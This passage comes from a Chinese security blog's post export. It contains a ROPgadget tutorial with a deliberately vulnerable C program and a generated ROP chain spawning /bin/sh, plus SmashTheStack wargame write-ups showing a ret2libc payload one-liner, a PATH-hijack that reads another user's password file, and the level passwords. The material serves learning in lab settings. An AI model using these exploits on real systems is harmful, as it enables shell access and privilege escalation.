PE文件，逆向分析工具、结合工具破解crackme<br>大家都知道，其实逆向知识很枯燥。不过，解放军工程大学的教授讲解的内容，图文并茂，由浅入深，与实际生活相结合，向大家展示了逆向分析的原理和具体应用。<br>老师先演示了扫雷彩蛋、蜘蛛纸牌一键通关，这些都是逆向的功劳。然后通过crackme，具体化逆向过程。让许多没有接触过逆向的人，对这个领域产生了浓厚的兴趣。</li>\n<li>####缓冲区溢出<br>主要知识点：缓冲区溢出基本原理、相关工具、Linux基础知识、metasploit框架演示MS08-067漏洞利用。</li>\n</ul>\n<p>#3、CTF比赛<br>实践是检验真理的唯一标准。前几天都讲述基本原理，实践的时间少，真正考验人的是CTF比赛，大家真正的将所学的知识应用到实践中。虽然我对缓冲区溢出的原理比较熟，但是一直都是看paper比较多，没有真正去实现POC、没有分析实际漏洞，所以实际动起手来并没有什么优势。实战的时候，CTF比赛的环境是Windows下的，由于对相关工具不够熟悉，成果并不好，深深的体会到，光是了解原理是不够的，还是要多动手，多练。<br>在实战中，我主要做web方向的题目，深刻体会到纸上得来终觉浅，了解原理是远远不够。首先要善于分析，根据系统爆出来的错误特点，分析可能的漏洞结果，选择合适的工具，工具选得好用的对，事半功倍，然后利用工具实现暴库，接着根据数据库的版本等信息，判断可能存在的漏洞，进一步提权，拿下整个系统。</p>\n<p>#4、感悟<br>自己对知识点的理解还停留的理论层面，这无论是对做研究，还是以后的发展都是不利的，之前我实现POC的时候，觉得这些大型程序在分析过程中，一头雾水，无从下手，殊不知，是自己不肯花时间，畏难。<br>以后要多在时间中巩固知识点。</p>\n"},{"title":"使用ROPgadget构建gadgets链，实现ROP攻击","url":"http://huirong.github.io/2015/06/12/use-ROPgadget-to-chain-gadgets/","content":"<p>上篇博客简单介绍了ROPgadget，现在我们就来小试牛刀<br><a id=\"more\"></a></p>\n<h1 id=\"I、C程序\"><a href=\"#I、C程序\" class=\"headerlink\" title=\"I、C程序\"></a>I、C程序</h1><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">function</span><span class=\"params\">(<span class=\"keyword\">char</span> *a)</span></span>&#123;</div><div class=\"line\">        <span class=\"keyword\">char</span> buff[<span class=\"number\">40</span>];</div><div class=\"line\">        <span class=\"built_in\">strcpy</span>(buff,a);</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span>** argv)</span></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span>(argc&gt;=<span class=\"number\">2</span>)</div><div class=\"line\">        function(argv[<span class=\"number\">1</span>]);</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p>编译C程序<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">gcc hello.c -o hello -<span class=\"keyword\">static</span> -g -fno-<span class=\"built_in\">stack</span>-protector</div></pre></td></tr></table></figure></p>\n<h1 id=\"II、使用ROPgadget构建gadget链\"><a href=\"#II、使用ROPgadget构建gadget链\" class=\"headerlink\" title=\"II、使用ROPgadget构建gadget链\"></a>II、使用ROPgadget构建gadget链</h1><p>ROPgadget的安装<a href=\"http://huirong.github.io/2015/06/12/ROPgadget/\">上篇博客</a>已经介绍了,这里不赘述。<br><figure class=\"highlight brainfuck\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">ropgadget</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">binary</span> <span class=\"comment\">hello</span> <span class=\"literal\">-</span><span class=\"literal\">-</span><span class=\"comment\">ropchain</span></div></pre></td></tr></table></figure></p>\n<p>创建输入文件exploit.py<br><figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">#!/usr/bin/env python2</span></div><div class=\"line\"><span class=\"comment\"># execve generated by ROPgadget</span></div><div class=\"line\"></div><div class=\"line\">from struct import <span class=\"keyword\">pack</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># Padding goes here</span></div><div class=\"line\">p = <span class=\"string\">''</span></div><div class=\"line\">p += <span class=\"string\">'a'</span>*<span class=\"number\">52</span></div><div class=\"line\"></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080570ca</span>) <span class=\"comment\"># pop edx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee060</span>) <span class=\"comment\"># @ .data</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x0808d211</span>) <span class=\"comment\"># pop eax ; ret</span></div><div class=\"line\">p += <span class=\"string\">'/bin'</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x0808e28d</span>) <span class=\"comment\"># mov dword ptr [edx], eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080570ca</span>) <span class=\"comment\"># pop edx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee064</span>) <span class=\"comment\"># @ .data + 4</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x0808d211</span>) <span class=\"comment\"># pop eax ; ret</span></div><div class=\"line\">p += <span class=\"string\">'//sh'</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x0808e28d</span>) <span class=\"comment\"># mov dword ptr [edx], eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080570ca</span>) <span class=\"comment\"># pop edx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee068</span>) <span class=\"comment\"># @ .data + 8</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080514e0</span>) <span class=\"comment\"># xor eax, eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x0808e28d</span>) <span class=\"comment\"># mov dword ptr [edx], eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080481ec</span>) <span class=\"comment\"># pop ebx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee060</span>) <span class=\"comment\"># @ .data</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080997d3</span>) <span class=\"comment\"># pop ecx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee068</span>) <span class=\"comment\"># @ .data + 8</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080570ca</span>) <span class=\"comment\"># pop edx ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080ee068</span>) <span class=\"comment\"># @ .data + 8</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080514e0</span>) <span class=\"comment\"># xor eax, eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x08099b66</span>) <span class=\"comment\"># inc eax ; ret</span></div><div class=\"line\">p += <span class=\"keyword\">pack</span>(<span class=\"string\">'&lt;I'</span>, <span class=\"number\">0x080493b9</span>) <span class=\"comment\"># int 0x80</span></div><div class=\"line\"><span class=\"keyword\">print</span> p</div></pre></td></tr></table></figure></p>\n<p><font color=\"red\">注意：要在gadget之前添加 p += ‘a’*52</font><br>原因：使函数的返回地址指向第一个gadget</p>\n<h1 id=\"III、使用gdb分析内存\"><a href=\"#III、使用gdb分析内存\" class=\"headerlink\" title=\"III、使用gdb分析内存\"></a>III、使用gdb分析内存</h1><figure class=\"highlight ebnf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"attribute\">gdbtui hello</span></div></pre></td></tr></table></figure>\n<h2 id=\"①-添加断点，设置参数\"><a href=\"#①-添加断点，设置参数\" class=\"headerlink\" title=\"① 添加断点，设置参数\"></a>① 添加断点，设置参数</h2><p>根据自己喜欢在程序某个地方设置断点，我一般设置在主函数处<br>运行时参数为 ./exploit.py 的运行结果<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1et1d063ftej30px0fq0yj.jpg\" alt=\"\"></p>\n<h2 id=\"②-查看寄存器\"><a href=\"#②-查看寄存器\" class=\"headerlink\" title=\"② 查看寄存器\"></a>② 查看寄存器</h2><p>当运行完strcpy()函数后，查看寄存器情况，主要留意esp  ebp的值<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1et1d0cngncj30n80fp43t.jpg\" alt=\"\"></p>\n<h2 id=\"③-查看内存情况\"><a href=\"#③-查看内存情况\" class=\"headerlink\" title=\"③ 查看内存情况\"></a>③ 查看内存情况</h2><p>ebp为0xbffff288，则返回地址在0xbffff28c处，可以发现此时返回地址是第一个gadget的起始地址处</p>\n<p><font color=\"red\">p += ‘a’*52 是为了覆盖缓冲区，直到返回地址处</font><br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1et1d0lh38xj30nr05rads.jpg\" alt=\"\"></p>\n<h1 id=\"IV、运行结果\"><a href=\"#IV、运行结果\" class=\"headerlink\" title=\"IV、运行结果\"></a>IV、运行结果</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">./hello <span class=\"string\">\"<span class=\"variable\">$(./exploit.py)</span>\"</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1et1d0ryguaj30fe016t8q.jpg\" alt=\"\"></p>\n<h1 id=\"V、参考文献\"><a href=\"#V、参考文献\" class=\"headerlink\" title=\"V、参考文献\"></a>V、参考文献</h1><p><a href=\"https://hwchen18546.wordpress.com/2014/07/15/rop-use-ropgadget-to-chain-gadgets/\" target=\"_blank\" rel=\"external\">use ROPgadget to chain gadgets</a></p>\n"},{"title":"ROPgadget安装","url":"http://huirong.github.io/2015/06/12/ROPgadget/","content":"<p>ROPgadget是一个自动化的搜索工具，找到指定二进制文件中的gadgets，来帮助我们实现ROP攻击。支持x86、x64、ARM、ARM64、PowerPC、SPARC和MIPS架构。<br><a id=\"more\"></a><br>下载网址：<a href=\"https://github.com/JonathanSalwan/ROPgadget\" target=\"_blank\" rel=\"external\">https://github.com/JonathanSalwan/ROPgadget</a></p>\n<h1 id=\"I、安装\"><a href=\"#I、安装\" class=\"headerlink\" title=\"I、安装\"></a>I、安装</h1><h2 id=\"①-安装Capstone\"><a href=\"#①-安装Capstone\" class=\"headerlink\" title=\"① 安装Capstone\"></a>① 安装Capstone</h2><p>Capstone是一个轻量级的多平台架构支持的反汇编架构，支持包括ARM\\ARM64、MIPC和x64/x86平台。<br><figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install <span class=\"keyword\">python</span>-capstone</div></pre></td></tr></table></figure></p>\n<h2 id=\"②-下载ROPgadget\"><a href=\"#②-下载ROPgadget\" class=\"headerlink\" title=\"② 下载ROPgadget\"></a>② 下载ROPgadget</h2><p>下载ROPgadget并解压，就可以使用ROPgadget了。<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1et1cc51hfnj30oo0240tj.jpg\" alt=\"\"><br>也可以上诉命令使用别名<br><figure class=\"highlight monkey\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">alias</span> <span class=\"title\">ropgadget</span>=<span class=\"string\">\"/home/star/ROP/ROPgadget-master/ROPgadget.py\"</span></div></pre></td></tr></table></figure></p>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1et1ccc944xj30p3014q3k.jpg\" alt=\"\"></p>\n<h1 id=\"II、参考文献\"><a href=\"#II、参考文献\" class=\"headerlink\" title=\"II、参考文献\"></a>II、参考文献</h1><p><a href=\"http://shell-storm.org/project/ROPgadget/\" target=\"_blank\" rel=\"external\">ROPgadget - Gadgets finder and auto-roper</a><br><a href=\"https://github.com/JonathanSalwan/ROPgadget\" target=\"_blank\" rel=\"external\">https://github.com/JonathanSalwan/ROPgadget</a></p>\n"},{"title":"SmashTheStack IO level5","url":"http://huirong.github.io/2015/05/30/smashTheStack-io-level5/","content":"<p>密码：LOoCy5PbKi63qXTh<br><a id=\"more\"></a></p>\n<h1 id=\"I、源代码\"><a href=\"#I、源代码\" class=\"headerlink\" title=\"I、源代码\"></a>I、源代码</h1><h2 id=\"①-源代码\"><a href=\"#①-源代码\" class=\"headerlink\" title=\"① 源代码\"></a>① 源代码</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> **argv)</span> </span>&#123;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">char</span> buf[<span class=\"number\">128</span>];</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span>(argc &lt; <span class=\"number\">2</span>) <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">strcpy</span>(buf, argv[<span class=\"number\">1</span>]);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"%s\\n\"</span>, buf);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"②-执行结果\"><a href=\"#②-执行结果\" class=\"headerlink\" title=\"② 执行结果\"></a>② 执行结果</h2><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1esmcb5wlznj30k201lq34.jpg\" alt=\"\"></p>\n<h1 id=\"II、相关知识\"><a href=\"#II、相关知识\" class=\"headerlink\" title=\"II、相关知识\"></a>II、相关知识</h1><ul>\n<li>最基本的缓冲区溢出 level3就是基本缓冲区溢出例子，相信大家都了解了</li>\n<li><a href=\"http://www.ibm.com/developerworks/cn/linux/1402_liumei_rilattack/\" target=\"_blank\" rel=\"external\">ret2lib</a>        原理有点长，我就不赘述了，大家可以参考我给的链接，也可以自己找原理</li>\n</ul>\n<h1 id=\"III、找漏洞\"><a href=\"#III、找漏洞\" class=\"headerlink\" title=\"III、找漏洞\"></a>III、找漏洞</h1><h2 id=\"①-思路\"><a href=\"#①-思路\" class=\"headerlink\" title=\"① 思路\"></a>① 思路</h2><p>观察前几关的程序，需要构造输入的，最终的目的是执行execl(“/bin/sh”)<br>所以我首先想到的是，构造输入，修改main返回地址，让其指向库函数execl()起始地址，为了让execl正常返回，exit()地址入栈，然后参数”/bin/sh”入栈<br>栈结果如图：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1esmcbnj1jlj30oe0esac4.jpg\" alt=\"\"></p>\n<h2 id=\"②-引入环境变量\"><a href=\"#②-引入环境变量\" class=\"headerlink\" title=\"② 引入环境变量\"></a>② 引入环境变量</h2><p>不存在值为”/bin/sh”的环境变量，首先引入环境变量BIN_SH（名字自拟），在同一个shell下，地址不变<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1esmcczmmznj30k5021aag.jpg\" alt=\"\"></p>\n<h2 id=\"③-gdb调试\"><a href=\"#③-gdb调试\" class=\"headerlink\" title=\"③ gdb调试\"></a>③ gdb调试</h2><p>查看buf，ret地址,计算两者的差距<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1esmcc9q14yj30k30bmgom.jpg\" alt=\"\"><br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1esmcci3a7vj30k309mafx.jpg\" alt=\"\"></p>\n<p>buf：0xbffffbb0，ret：0xbffffc3c，两者相差 0x8c<br>因此<font color=\"red\">输入格式：</font> “A”*0x8c + execl()起始地址 + exit()起始地址 + “/bin/sh”起始地址</p>\n<h2 id=\"④-查看execl-、exit-、”-bin-sh”地址\"><a href=\"#④-查看execl-、exit-、”-bin-sh”地址\" class=\"headerlink\" title=\"④ 查看execl()、exit()、”/bin/sh”地址\"></a>④ 查看execl()、exit()、”/bin/sh”地址</h2><p>在调试过程中可以p system     p exit 就可以查看了<br>环境变量BIN_SH在栈的下面，x/1000s 0xbffffbb0  可以打印出从0xbffffbb0开始的1000个字符（具体单位我也不清楚，大家自己百度），一直向下查看就可以找到BIN_SH了<br><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCjw1esmccofiyfj30k307mwh3.jpg\" alt=\"\"><br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdday4nj30k30c375r.jpg\" alt=\"\"></p>\n<p>execl  : 0xb7f0f3f0<br>exit   : 0xb7e9d270<br>BIN_SH=/bin/sh : 0xbfffff6f<br>/bin/sh : 0xbfffff76</p>\n<h2 id=\"⑤-校正”-bin-sh”地址\"><a href=\"#⑤-校正”-bin-sh”地址\" class=\"headerlink\" title=\"⑤ 校正”/bin/sh”地址\"></a>⑤ 校正”/bin/sh”地址</h2><p>现在来验证下BIN_SH的地址是否正确<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1esmcdvn3mzj30k302jmyt.jpg\" alt=\"\"><br>这个是调用execl()函数时，参数出错提示，说明execl地址正确<br>根据我的血泪史，一般函数地址这样查找都没有错，环境变量的地址一般不正确<br>经过我多次测试，/bin/sh : 0xbfffff70</p>\n<p><font color=\"red\">PS：</font>我的校正方法<br>在/tmp 目录下新建一个自己的文件夹 star<br>进入 star 文件夹  ：cd star<br>想办法生成core文件，调试时，加上core文件，gdb ./level05 core -q  ，然后查看 BIN_SH 的地址</p>\n<h2 id=\"⑥-获得密码\"><a href=\"#⑥-获得密码\" class=\"headerlink\" title=\"⑥ 获得密码\"></a>⑥ 获得密码</h2><p>输入格式 “A”*0x8c + “0xb7f0f3f0” + “0xb7e9d270” + “0xbfffff70”</p>\n<p>“$(python -c ‘print “A”*0x8c + “\\x30\\x9c\\xea\\xb7” + “\\x70\\xd2\\xe9\\xb7” + “\\x70\\xff\\xff\\xbf” ‘)”<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1esmce74oxcj30k203iabv.jpg\" alt=\"\"></p>\n<p>OK！！！ 密码get：rXCikld0ex3EQsnI</p>\n"},{"title":"SmashTheStack IO level4","url":"http://huirong.github.io/2015/05/22/smashTheStack-io-level4/","content":"<p>密码：nSwmULj2LpDnRGU2<br><a id=\"more\"></a></p>\n<h1 id=\"I、源代码\"><a href=\"#I、源代码\" class=\"headerlink\" title=\"I、源代码\"></a>I、源代码</h1><h2 id=\"①-源代码：\"><a href=\"#①-源代码：\" class=\"headerlink\" title=\"① 源代码：\"></a>① 源代码：</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//writen by bla</span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">char</span> username[<span class=\"number\">1024</span>];</div><div class=\"line\">    FILE* f = popen(<span class=\"string\">\"whoami\"</span>,<span class=\"string\">\"r\"</span>);</div><div class=\"line\">    fgets(username, <span class=\"keyword\">sizeof</span>(username), f);</div><div class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"Welcome %s\"</span>, username);</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h2 id=\"②-执行结果：\"><a href=\"#②-执行结果：\" class=\"headerlink\" title=\"② 执行结果：\"></a>② 执行结果：</h2><p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1esldar1lq1j30i801kglq.jpg\" alt=\"\"></p>\n<h2 id=\"③-分析结果\"><a href=\"#③-分析结果\" class=\"headerlink\" title=\"③ 分析结果\"></a>③ 分析结果</h2><p>welcome level5，说明系统是在level5下执行的whoami命令，而我们想要的是在level5下执行 cat /home/level5/.pass 命令，查看level5密码<br>程序不需要任何输入，我们不能构造输入；不能改变源代码，因此不能在popen中添加命令<br>我们可不可以改变whoami命令的内容呢？？<br>先看下相关介绍，或许会有思路</p>\n<h1 id=\"II、相关知识\"><a href=\"#II、相关知识\" class=\"headerlink\" title=\"II、相关知识\"></a>II、相关知识</h1><h2 id=\"①-PATH环境变量\"><a href=\"#①-PATH环境变量\" class=\"headerlink\" title=\"① PATH环境变量\"></a>① PATH环境变量</h2><p>$PATH：决定了shell将到哪些目录中寻找命令或程序，PATH的值是一系列目录，当您运行一个程序时，Linux在这些目录下进行搜寻编译链接。</p>\n<p><font color=\"red\">思路：</font>在$PATH中添加一个目录，指向我们自己创建的whoami命令文件，whoami中的内容是 cat /home/level5/.pass，shell执行whoami命令时，先找到我们创建的目录，然后就不在向下查看，直接执行命令</p>\n<h2 id=\"②-which\"><a href=\"#②-which\" class=\"headerlink\" title=\"② which\"></a>② which</h2><p>which命令的作用是，在PATH变量指定的路径中，搜索某个系统命令的位置，并且返回第一个搜索结果。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。</p>\n<h1 id=\"III、找漏洞\"><a href=\"#III、找漏洞\" class=\"headerlink\" title=\"III、找漏洞\"></a>III、找漏洞</h1><h2 id=\"①-查看命令位置\"><a href=\"#①-查看命令位置\" class=\"headerlink\" title=\"① 查看命令位置\"></a>① 查看命令位置</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">which</span> whoami</div></pre></td></tr></table></figure>\n<p><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1esldtip2x7j30k301jt8t.jpg\" alt=\"\"></p>\n<h2 id=\"②-构造PATH并验证是否成功\"><a href=\"#②-构造PATH并验证是否成功\" class=\"headerlink\" title=\"② 构造PATH并验证是否成功\"></a>② 构造PATH并验证是否成功</h2><p>自定义whoami内容：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1esldn58eobj30k403n3zw.jpg\" alt=\"\"></p>\n<p>赋予执行权限<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCgw1esldo6oa1kj30k40230t9.jpg\" alt=\"\"></p>\n<p>添加新的whoami命令路径：<br><img src=\"https://ww4.sinaimg.cn/large/005CA6ZCjw1esldp2b06jj30k302ldgx.jpg\" alt=\"\"></p>\n<p>再次查看whoami路径：<br><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1esldpzi8w0j30k301it8t.jpg\" alt=\"\"></p>\n<h2 id=\"③-查看密码\"><a href=\"#③-查看密码\" class=\"headerlink\" title=\"③ 查看密码\"></a>③ 查看密码</h2><p><img src=\"https://ww1.sinaimg.cn/large/005CA6ZCgw1esldqe3qs3j30k2012dfx.jpg\" alt=\"\"><br>密码：nSwmULj2LpDnRGU2</p>\n"},{"title":"SmashTheStack IO level3","url":"http://huirong.github.io/2015/05/22/smashTheStack-io-level3/","content":"<p>密码：IFd92yzOnSMv9tkX<br><a id=\"more\"></a><br>这个是最基本的缓冲区溢出，如果不明白缓冲区溢出的，可以自己百度。。。。。。</p>\n<h1 id=\"I、源码\"><a href=\"#I、源码\" class=\"headerlink\" title=\"I、源码\"></a>I、源码</h1><h2 id=\"①-源代码：\"><a href=\"#①-源代码：\" class=\"headerlink\" title=\"① 源代码：\"></a>① 源代码：</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div 